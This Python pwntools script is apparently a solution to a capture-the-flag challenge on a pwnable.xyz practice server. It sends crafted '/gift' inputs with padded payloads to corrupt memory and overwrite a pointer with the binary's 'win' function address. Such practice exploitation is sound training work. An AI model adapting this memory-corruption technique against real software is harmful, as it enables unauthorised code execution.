from pwn import *


context(kernel="amd64", arch="amd64", log_level="debug")


def main():
	e = ELF("challenge")
	env = dict(os.environ)
	# env["LD_PRELOAD"] = "./ld.so ./alpine-libc-2.24.so"

	if 0:
		p = process("./challenge", env=env)
		# gdb.attach(p)
	elif 0:
		p = process(["strace", "-o", "strace.out", "./challenge"])
	else:
		p = remote("svc.pwnable.xyz", 30034)

	win_addr = e.symbols["win"]

	first_payload = b"\x90"*395+b"\x7d"
	first_size = 396
	second_payload = b"\x90"*339+b"\x3f"
	second_size = 340
	all_size = max(first_size, second_size)*2


	p.sendafter(b"@you>", b"/gift\n");
	p.sendlineafter(b"Ok, how expensive will your gift be: ", str(all_size).encode("utf-8"))
	p.sendafter(b"Enter your gift: ", first_payload+second_payload)
	# p.interactive()
	# p.sendafter(b"@you>", b"A"*8+p64(win_addr)+b"S"*8)
	p.sendafter(b"@you>", b"/gift\n")
	p.sendlineafter(b"Ok, how expensive will your gift be: ", str(0x20).encode("utf-8"))
	p.sendafter(b"Enter your gift: ", b"A"*8+p64(win_addr))

	# p.sendafter(b"@you>", b"A"*8+p64(win_addr)+b"S"*8)

	p.sendafter(b"@you>", b"/gift\n");
	# p.sendlineafter(b"Ok, how expensive will your gift be: ", str(0x1f).encode("utf-8"))
	# p.sendafter(b"Enter your gift: ", b"A"*8+p64(win_addr))

	# p.sendafter(b"@you>", b"/gift\n");
	# p.sendlineafter(b"Ok, how expensive will your gift be: ", str(0x1f).encode("utf-8"))
	# p.sendafter(b"Enter your gift: ", b"A"*8+p64(win_addr))

	# p.sendafter(b"@you>", b"/gift\n");
	# p.sendlineafter(b"Ok, how expensive will your gift be: ", str(0x1f).encode("utf-8"))
	# p.sendafter(b"Enter your gift: ", b"A"*8+p64(win_addr))

	# p.sendafter(b"@you>", b"/gift\n");
	# p.sendlineafter(b"Ok, how expensive will your gift be: ", str(0x1f).encode("utf-8"))
	# p.sendafter(b"Enter your gift: ", b"A"*8+p64(win_addr))
	print(p.recvrepeat())


main()